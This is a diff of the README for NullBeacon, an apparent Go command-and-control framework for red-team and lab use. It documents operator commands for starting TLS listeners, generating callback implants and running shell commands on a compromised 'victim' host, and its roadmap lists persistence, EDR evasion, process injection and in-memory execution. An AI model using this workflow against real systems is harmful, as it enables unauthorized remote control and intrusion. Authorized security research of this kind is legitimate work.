@@ -1,32 +1,36 @@
 # 🕸️ NullBeacon
 
-A Command & Control (C2) framework built from scratch in Go, developed as a learning project to explore Go concurrency, networking, and security research concepts.
+> A Command & Control (C2) framework built from scratch in Go for authorized security research, CTF competitions, and home lab red teaming.
 
 > ⚠️ **For authorized security research, CTF, and home lab use only. Never deploy against systems you do not own or have explicit written permission to test.**
 
 ---
 
-## 🏗️ Architecture
+## 📡 Architecture
 
 ```
-Operator CLI
-     │
-     ▼
-Teamserver ──► ListenerManager
-     │              ├── TCP Listener :8080 ◄─── Agent(s)
-     │              ├── TLS Listener :8443 ◄─── Agent(s) (encrypted)
-     │              └── HTTP Listener :8081 (upcoming)
-     │
-     └── teamserver.log
+Operator Terminal
+      │
+      ▼
+ NullBeacon Teamserver
+      │
+      ├──► ListenerManager
+      │         ├── TCP  Listener  ◄──── Agent beacon
+      │         ├── TLS  Listener  ◄──── Agent beacon (encrypted)
+      │         └── HTTP Listener  (upcoming)
+      │
+      ├──► Agent Registry (UUID, hostname, username, last seen)
+      ├──► Task Queue (per agent, delivered on next beacon)
+      └──► teamserver.log
 ```
 
-| Component | Description |
+| Component | Role |
 |---|---|
-| `teamserver` | Core server — manages listeners, agents, tasks |
-| `listener` | Dynamic protocol listeners (TCP, HTTP, etc.) |
-| `agent` | Beacons home with jitter (8-12s), survives connection failures |
-| `tls.go` | Self-signed TLS certificate generation for encrypted comms |
-| `operator shell` | readline-powered CLI with colors and history |
+| `teamserver` | Core server — listeners, agents, task queue, operator shell |
+| `listener` | Pluggable protocol listeners (TCP, TLS, HTTP) |
+| `agent` | Implant — beacons home, executes tasks, returns output |
+| `tls.go` | Self-signed TLS certificate generation |
+| `generate.go` | Cross-compiles agent binaries for Linux / Windows |
 
 ---
 
@@ -37,17 +41,22 @@ go-c2/
 ├── cmd/
 │   ├── teamserver/
 │   │   ├── main.go         # Entry point, banner, operator shell
-│   │   ├── handlers.go     # Agent connection handling
+│   │   ├── handlers.go     # Agent connection and task delivery
 │   │   ├── listeners.go    # Listener start/stop/list
-│   │   ├── agents.go       # Agent list and interact shell
+│   │   ├── agents.go       # Agent list, interact shell, remove
 │   │   ├── generate.go     # Agent binary generation
+│   │   ├── tls.go          # TLS certificate generation
 │   │   └── help.go         # Help menu
-│   └── agent/              # Agent/implant binary
+│   └── agent/
+│       └── main.go         # Implant — beacon loop, task execution
 ├── pkg/
-│   ├── agent/              # Agent struct and registration logic
-│   ├── listener/           # Dynamic listener management
-│   ├── task/               # Task struct and queue logic
+│   ├── agent/              # Agent struct (ID, hostname, tasks, last seen)
+│   ├── listener/           # Listener struct with Start / StartTLS methods
+│   ├── task/               # Task struct and status tracking
 │   └── transport/          # (upcoming) HTTP transport
+├── .github/
+│   └── workflows/
+│       └── go.yml          # CI — build and test on every push
 ├── go.mod
 ├── go.sum
 └── teamserver.log          # Runtime log (gitignored)
@@ -67,84 +76,100 @@ go mod tidy
 
 ---
 
-## 🚀 Usage
+## 🚀 Quick Start
 
-**Start the teamserver:**
+**1. Start the teamserver:**
 ```bash
 go run ./cmd/teamserver
 ```
 
-Logs are written to `teamserver.log`. Monitor them in a separate terminal:
+**2. Start a listener:**
+```
+nullbeacon> listen tls --lhost 0.0.0.0 --lport 8443
+```
+
+**3. Generate an agent:**
+```
+nullbeacon> generate --os linux --arch amd64 --lhost <your_ip> --lport 8443
+```
+
+**4. Deploy and run the agent on the target machine.**
+
+**5. Interact with the agent:**
+```
+nullbeacon> list
+nullbeacon> interact <agentID>
+[agent:abc12345]> whoami
+```
+
+Logs are written to `teamserver.log`. Monitor in a separate terminal:
 ```bash
 tail -f teamserver.log
 ```
 
-**Start the agent** (defaults to `localhost:8080`):
-```bash
-go run ./cmd/agent
-```
-
-**Start the agent with a custom server address:**
-```bash
-go run ./cmd/agent -addr 192.168.1.10:8080
-```
-
-**Build binaries:**
-```bash
-go build ./cmd/teamserver
-go build ./cmd/agent
-```
-
 ---
 
-## 🖥️ Operator Shell
+## 🖥️ Operator Shell Reference
 
-Once the teamserver is running, the operator shell starts automatically.
+### Listeners
 
 | Command | Description |
 |---|---|
-| `listen tcp --lhost 0.0.0.0 --lport 8080` | Start a TCP listener |
-| `listen tls --lhost 0.0.0.0 --lport 8443` | Start a TLS listener (encrypted) |
+| `listen tcp --lhost 0.0.0.0 --lport 8080` | Start a plain TCP listener |
+| `listen tls --lhost 0.0.0.0 --lport 8443` | Start an encrypted TLS listener |
 | `listeners` | List all active listeners |
-| `stop <listenerID>` | Stop a listener |
-| `list` | List all connected agents |
+| `stop <listenerID>` | Stop and remove a listener |
+
+### Agents
+
+| Command | Description |
+|---|---|
+| `list` | List all connected agents with last seen timestamp |
 | `interact <agentID>` | Enter the agent shell |
 | `remove <agentID>` | Remove a dead agent from the list |
-| `generate --os linux --arch amd64 --lhost <ip> --lport <port>` | Generate an agent binary |
-| `help` | Show the help menu |
-| `exit` | Exit the operator shell |
+| `generate --os <os> --arch <arch> --lhost <ip> --lport <port>` | Generate an agent binary |
 
-**Inside the agent shell:**
+### Agent Shell
 
 | Command | Description |
 |---|---|
-| `<any command>` | Queue a task, wait for output automatically |
+| `<any command>` | Queue a task and wait for output |
 | `tasks` | List all tasks and their output |
 | `back` | Return to the main shell |
 
-**Example session:**
-```
-nullbeacon> listen tcp --lhost 0.0.0.0 --lport 8080
-started listener ebfe99d4-413f-4cad-a71e-7c1d6e4e7a9c on 0.0.0.0:8080
+### General
 
-nullbeacon> listeners
-Active listeners:
-ID: ebfe99d4-413f-4cad-a71e-7c1d6e4e7a9c, Protocol: tcp, Host: 0.0.0.0, Port: 8080, Status: running
+| Command | Description |
+|---|---|
+| `help` | Show the help menu |
+| `exit` | Exit NullBeacon |
+
+---
+
+## 💡 Example Session
+
+```
+nullbeacon> listen tls --lhost 0.0.0.0 --lport 8443
+started listener a1b2c3d4 on 0.0.0.0:8443
+
+nullbeacon> generate --os linux --arch amd64 --lhost 10.0.0.1 --lport 8443
+[*] generating linux/amd64 agent...
+[+] agent saved: /home/operator/GHOST_COBRA.elf (ID: 3f9a1b2c)
 
 nullbeacon> list
 Connected agents:
-ID: dev-agent-001, Username: chris, Hostname: target, Address: 192.168.1.5:51234, Last Seen: 2026-06-21 16:42:42
+ID: 3f9a1b2c, Username: victim, Hostname: target-pc, Address: 10.0.0.5:51234, Last Seen: 2026-06-21 16:42:42
 
-nullbeacon> interact dev-agent-001
-[agent:dev-agen]> whoami
-[*] task queued: b90b40e6-05a1-4ebb-adee-6f5d4881109c (waiting for output...)
-output: chris
-[agent:dev-agen]> tasks
-[b90b40e6] whoami → completed: chris
-[agent:dev-agen]> back
+nullbeacon> interact 3f9a1b2c
+[agent:3f9a1b2c]> whoami
+[*] task queued (waiting for output...)
+output: victim
+[agent:3f9a1b2c]> tasks
+[3f9a1b2c] whoami → completed: victim
+[agent:3f9a1b2c]> back
 
-nullbeacon> stop ebfe99d4-413f-4cad-a71e-7c1d6e4e7a9c
-stopped listener ebfe99d4-413f-4cad-a71e-7c1d6e4e7a9c
+nullbeacon> stop a1b2c3d4
+stopped listener a1b2c3d4
 
 nullbeacon> exit
 ```
@@ -153,47 +178,51 @@ nullbeacon> exit
 
 ## ✅ Features
 
-- [x] TCP listener with concurrent agent handling
+### Core
+- [x] TCP and TLS listeners with concurrent agent handling
 - [x] Read timeout protection against hung connections
 - [x] Agent check-in with hostname and username
 - [x] UUID-based agent registration
-- [x] Mutex-protected agent map for concurrent access
-- [x] Configurable server address via CLI flag (`-addr`)
-- [x] Agent beacon loop (every 10 seconds)
-- [x] Interactive operator shell
-- [x] Agent listing with full system info
-- [x] Task queuing per agent
-- [x] Log redirection to file (clean operator terminal)
+- [x] Mutex-protected agent and listener maps for concurrent access
 - [x] Persistent agent ID baked in at build time via `ldflags`
-- [x] Returning beacon detection (no duplicate registration)
-- [x] Task delivery on beacon
-- [x] Shell command execution on agent side (`os/exec`)
-- [x] Task output returned automatically to operator
+- [x] Returning beacon detection — no duplicate registration
+- [x] Task queuing per agent, delivered on next beacon
+- [x] Shell command execution on agent (`os/exec`)
+- [x] Multi-line task output flattened and returned to operator
 - [x] Real-time output polling in operator shell
+
+### Operator Experience
 - [x] NullBeacon ASCII banner with colored output (`fatih/color`)
 - [x] readline-powered prompt with command history (`chzyer/readline`)
-- [x] Dynamic listener management (start/stop/list)
-- [x] Context-based listener cancellation (`context.WithCancel`)
-- [x] Multi-protocol listener architecture (TCP now, HTTP/TLS upcoming)
-- [x] Agent binary generation with cross-compilation (`GOOS`/`GOARCH`)
-- [x] Random hacking-themed agent filenames (e.g. `GHOST_COBRA.elf`)
-- [x] Agent saves to operator's current working directory
-- [x] Colored help menu with full command reference
-- [x] Teamserver split into focused files (handlers, listeners, agents, generate, help)
-- [x] Agent reliability — retry loop, no fatal crashes, multi-line output support
-- [x] New agent notification printed to operator terminal on first check-in
-- [x] Last Seen timestamp on agent check-in
+- [x] New agent notification printed to terminal on first check-in
+- [x] Last Seen timestamp updated on every beacon
 - [x] Agent removal command (`remove <agentID>`)
+- [x] Colored help menu with full command reference
+- [x] Log redirection to file — clean operator terminal
+- [x] Teamserver split into focused files per responsibility
+
+### Listener Management
+- [x] Dynamic listener start/stop/list at runtime
+- [x] Context-based listener cancellation (`context.WithCancel`)
+- [x] TCP and TLS listener support
+- [x] Self-signed TLS certificate generated on startup
+
+### Agent Generation
+- [x] Cross-compilation for Linux and Windows (`GOOS`/`GOARCH`)
+- [x] Agent saves to operator's current working directory
+- [x] Random hacking-themed agent filenames (e.g. `GHOST_COBRA.elf`)
+- [x] Debug symbols stripped from binaries (`-s -w`)
+
+### OPSEC
 - [x] Sleep jitter — randomized beacon interval (8-12 seconds)
-- [x] Debug symbols stripped from generated binaries (`-s -w` ldflags)
-- [x] TLS transport — encrypted C2 channel with self-signed certificate
-- [x] TLS listener support (`listen tls`)
-- [x] Agent connects via TLS (`tls.Dial`)
+- [x] Encrypted C2 channel via TLS
+- [x] Agent retry loop — no crashes on connection failure
 
 ---
 
 ## 🗺️ Roadmap
 
+### Completed
 - [x] Stage 1 — TCP teamserver skeleton
 - [x] Stage 2 — Agent check-in with system info
 - [x] Stage 3 — Beacon loop
@@ -206,16 +235,27 @@ nullbeacon> exit
 - [x] Stage 7.7 — Agent generation with cross-compilation and themed names
 - [x] Stage 7.8 — Help menu and teamserver refactor into focused files
 - [x] Stage 7.9 — Agent reliability (retry loop, multi-line output, no fatal crashes)
-- [x] Stage 7.10 — Operator UX (new agent notifications, timestamps, agent removal)
+- [x] Stage 7.10 — Operator UX (agent notifications, timestamps, remove command)
 - [x] Stage 7.11 — Basic OPSEC (strip symbols, sleep jitter)
-- [x] Stage 7.12 — TLS transport (encrypt the C2 channel)
-- [ ] Stage 8 — Persistence (registry, cron, systemd)
-- [ ] Stage 9 — Evasion (sleep jitter, AMSI/ETW stubs)
+- [x] Stage 7.12 — TLS transport (encrypted C2 channel)
+
+### In Progress
+- [ ] Stage 8 — Persistence (Linux cron, Windows registry)
+
+### Planned
+- [ ] Stage 9 — Evasion (AMSI/ETW stubs, sleep obfuscation)
 - [ ] Stage 10 — Packing (AES payload encryption, custom loaders)
-- [ ] Stage 11 — Transport hardening (TLS, malleable profiles)
+- [ ] Stage 11 — Transport hardening (HTTP listener, malleable profiles)
+
+### Stealth Roadmap (Post Stage 11)
+- [ ] Stage 12 — Process injection (execute inside legitimate processes)
+- [ ] Stage 13 — Living off the Land (LOLBins — use built-in OS tools)
+- [ ] Stage 14 — Malleable C2 profiles (traffic mimics Google/Microsoft)
+- [ ] Stage 15 — Syscall obfuscation (bypass EDR user-mode hooks)
+- [ ] Stage 16 — In-memory execution (never touch disk)
 
 ---
 
 ## ⚠️ Disclaimer
 
-This project is built for **educational purposes**, **CTF competitions**, and **authorized security research**. The authors are not responsible for misuse.
+This project is built for **educational purposes**, **CTF competitions**, and **authorized security research**. The authors are not responsible for misuse. Always obtain explicit written permission before testing against any system you do not own.
